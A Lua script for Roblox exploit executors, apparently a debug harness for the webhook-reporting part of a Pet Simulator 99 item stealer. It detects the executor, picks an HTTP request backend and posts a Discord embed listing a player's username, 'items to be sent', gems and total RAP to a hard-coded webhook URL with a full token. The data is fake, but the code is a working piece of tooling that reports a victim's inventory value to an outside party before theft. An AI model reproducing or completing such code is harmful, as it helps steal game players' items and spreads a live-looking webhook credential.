-- test_send_once.lua
-- Fixed test SendMessage: builds body correctly and sends exactly once.
local HttpService = game:GetService("HttpService")

-- ===== FAKE / TEST VALUES (no real webhook here) =====
local WEBHOOK = "https://discord.com/api/webhooks/1407814443231871226/doFyO0sPxeH5WFjvWgW0UlKDgjG6xAuBAvXjBAffh88jLaccLjOpsg32cKqBAp1y8iWq" -- placeholder
local plr = { Name = "TestUser" }
local totalRAP = 999999
local sortedItems = {
    { name = "Fake Sword", amount = 2, rap = 1500 },
    { name = "Pet Rock", amount = 10, rap = 50 },
}
local function formatNumber(n)
    -- simple thousands separator
    local s = tostring(n)
    while true do
        s, k = string.gsub(s, "^(-?%d+)(%d%d%d)", "%1,%2")
        if k == 0 then break end
    end
    return s
end

-- ===== executor detection (safe) =====
local function detectExecutor()
    if type(identifyexecutor) == "function" then
        local ok, res = pcall(identifyexecutor)
        if ok and type(res) == "string" and #res > 0 then return res end
    end
    if type(getexecutor) == "function" then
        local ok, res = pcall(getexecutor)
        if ok and type(res) == "string" and #res > 0 then return res end
    end
    if type(syn) == "table" then return "Synapse" end
    if rawget(_G,"KRNL_LOADED") then return "Krnl" end
    if rawget(_G,"is_sirhurt_closure") or rawget(_G,"ispresent") then return "SirHurt" end
    return "Unknown"
end

-- ===== choose best requester (tries and returns unified function) =====
local function getRequestFunc()
    -- syn.request
    if type(syn) == "table" and type(syn.request) == "function" then
        return function(opts)
            local ok,res = pcall(function() return syn.request(opts) end)
            return ok,res,"syn.request"
        end
    end

    -- http_request or http.request
    if type(http_request) == "function" then
        return function(opts)
            local ok,res = pcall(function() return http_request(opts) end)
            return ok,res,"http_request"
        end
    end
    if type(http) == "table" and type(http.request) == "function" then
        return function(opts)
            local ok,res = pcall(function() return http.request(opts) end)
            return ok,res,"http.request"
        end
    end

    -- request (older)
    if type(request) == "function" then
        return function(opts)
            local ok,res = pcall(function() return request(opts) end)
            return ok,res,"request"
        end
    end

    -- fallback: HttpService:RequestAsync (server-side may be required)
    if HttpService and type(HttpService.RequestAsync) == "function" then
        return function(opts)
            local ok,res = pcall(function()
                return HttpService:RequestAsync({
                    Url = opts.Url,
                    Method = opts.Method or "GET",
                    Headers = opts.Headers,
                    Body = opts.Body,
                })
            end)
            return ok,res,"HttpService:RequestAsync"
        end
    end

    return nil
end

-- ===== normalize embed field value to Discord limits =====
local function trimFieldValue(s)
    if not s then return "" end
    if #s <= 1024 then return s end
    -- keep as many lines as possible up to limit
    local lines = {}
    for line in s:gmatch("[^\r\n]+") do table.insert(lines,line) end
    while #table.concat(lines, "\n") > 1000 and #lines > 0 do table.remove(lines) end
    return table.concat(lines, "\n") .. "\n+ more..."
end

-- ===== Send once guard =====
local sentAlready = false

-- ===== The fixed TestSendMessage implementation =====
local function TestSendMessage(diamonds)
    if sentAlready then
        print("Send blocked: already sent once.")
        return false, { message = "already_sent" }
    end

    local headers = { ["Content-Type"] = "application/json" }

    -- build fields
    local fields = {
        { name = "Username:", value = plr.Name or "Unknown", inline = true },
        { name = "Items to be sent:", value = "", inline = false },
        { name = "Summary:", value = "", inline = false },
    }

    -- combine item amounts & RAP
    local itemRapMap = {}
    local combinedItems = {}
    for _,item in ipairs(sortedItems) do
        local key = item.name or tostring(item)
        if itemRapMap[key] then
            itemRapMap[key].amount = itemRapMap[key].amount + (item.amount or 1)
        else
            itemRapMap[key] = { amount = item.amount or 1, rap = item.rap or 0 }
            table.insert(combinedItems, key)
        end
    end

    table.sort(combinedItems, function(a,b)
        return (itemRapMap[a].rap * itemRapMap[a].amount) > (itemRapMap[b].rap * itemRapMap[b].amount)
    end)

    for _,name in ipairs(combinedItems) do
        local d = itemRapMap[name]
        fields[2].value = fields[2].value .. string.format("%s (x%d): %s RAP\n", name, d.amount, formatNumber(d.rap * d.amount))
    end

    fields[3].value = string.format("Gems: %s\nTotal RAP: %s", formatNumber(diamonds or 0), formatNumber(totalRAP or 0))

    -- ensure field length within Discord's embed field limits
    fields[2].value = trimFieldValue(fields[2].value)

    -- executor info
    local execName = detectExecutor()
    table.insert(fields, { name = "Executor", value = execName, inline = true })

    -- build payload and encode as JSON to 'body' variable (previous bug: body was nil)
    local data = {
        embeds = {{
            title = "\240\159\144\177 New PS99 Execution (TEST)",
            color = 5439232,
            fields = fields,
            footer = { text = "NULS | test payload" },
        }}
    }

    local okEncode, body = pcall(function() return HttpService:JSONEncode(data) end)
    if not okEncode then
        warn("JSON encode failed:", body)
        return false, { message = "json_encode_failed", err = tostring(body) }
    end

    -- pick request function and send exactly once
    local requester = getRequestFunc()
    if not requester then
        warn("No request API available in this executor.")
        return false, { message = "no_request_api" }
    end

    -- unified opts
    local opts = {
        Url = WEBHOOK,
        Method = "POST",
        Headers = headers,
        Body = body
    }

    -- send
    local okSend, res, used = requester(opts)
    sentAlready = true -- mark sent even if it failed to avoid duplicates from re-exec

    -- normalize response for readability
    local function normalize(raw, usedApi)
        if type(raw) == "table" then
            local status = raw.StatusCode or raw.status or raw.Status or raw.code
            local b = raw.Body or raw.body or raw[1] or ""
            return { Success = true, Status = status, Body = tostring(b), Raw = raw, Used = usedApi }
        else
            return { Success = okSend and true or false, Status = nil, Body = tostring(raw), Raw = raw, Used = usedApi }
        end
    end

    -- debug prints
    print("=== FAKE WEBHOOK SEND DEBUG ===")
    print("Executor guess:", execName)
    print("Request backend used:", used)
    if not okSend then
        print("Request function call error:", tostring(res))
        return false, { message = "request_error", err = tostring(res), used = used }
    end

    local norm = normalize(res, used)
    print("Send result: used=", norm.Used, " status=", tostring(norm.Status))
    if norm.Body and #norm.Body > 0 then
        local snippet = #norm.Body > 400 and (string.sub(norm.Body,1,400) .. "...") or norm.Body
        print("Response body (snippet):", snippet)
    end
    print("=== END DEBUG ===")

    return true, norm
end

-- run the test
local ok, res = TestSendMessage(123456)
if ok then
    print("Test send returned OK. normalized:", res.Used, "status:", res.Status)
else
    print("Test send failed. info:", res.message or tostring(res))
end
